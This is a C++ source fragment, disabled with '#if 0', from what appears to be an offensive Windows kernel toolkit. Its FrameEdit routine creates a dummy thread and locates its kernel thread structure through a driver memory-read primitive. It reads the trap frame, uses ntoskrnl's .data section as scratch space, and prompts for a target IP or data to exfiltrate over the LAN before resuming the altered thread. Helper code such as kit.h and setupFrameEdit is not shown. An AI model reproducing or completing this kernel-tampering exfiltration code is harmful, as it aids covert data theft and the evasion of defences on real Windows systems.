#if 0
// Legacy reference implementation — kept for reference only.
// Requires kit.h which is not part of this project.

#include "kit.h"
#include <iostream>
#include <string>
using namespace std;

void Kit::FrameEdit() {
    printf("Entering frame editing , spawning dummy thread.\n");

    HANDLE getthreadHandle = createdummyThread();
    printf("Thread handle: %llx\n", (UINT64)getthreadHandle);

    DWORD tid = GetThreadId(getthreadHandle);
    if (getthreadHandle == (HANDLE)-1)
    {
        printf("[-] Error! Couldn't create the \"dummy thread\". Error: 0x%lx\n", GetLastError());
        return;
    }
    printf("[+] Created the dummy thread!\n");

    Sleep(50);

    UINT64 kthread = tidfinder(tid);
    printf("tid found (same as kthread/ethread struct here): %llx\n", kthread);

    UINT64 frameaddr;
    driver.Read(&frameaddr, kthread + offsets.KT_TrapFrame, 0x8);
    printf("stack frame found at: %llx\n", frameaddr);
    printf("nt (ntoskrnl) is at : %llx\n", offsets.NTOSKRNLbase);

    UINT64 scratch = offsets.NTOSKRNLbase + offsets.NTOSKRNLdata + 0x80000;
    printf("Using .data section of ntsokrnl for scratch at nt+%llx, placing the scratch pad  at: %llx \n", offsets.NTOSKRNLdata + 0x80000, scratch);

    string input;
    printf("Enter target ip or information to xfil to lan\n");
    getline(cin, input);

    setupFrameEdit(scratch, frameaddr, input.c_str());
    printf("Starting frame editing\n");

    ResumeThread(getthreadHandle);
    printf(" Run tcpdump on server if this is finishing with no connection.\n");

    UINT64 rHandle, rIOSbeg, rIOSend;
    driver.Read(&rHandle, scratch + 0x80, 0x8);
    driver.Read(&rIOSbeg, scratch + 0x88, 0x8);
    driver.Read(&rIOSend, scratch + 0x90, 0x8);
    printf("Returned handle: %llx, Returned IOstatus begining: %llx, Returned IOstatus end: %llx.\n", rHandle, rIOSbeg, rIOSend);
}
#endif
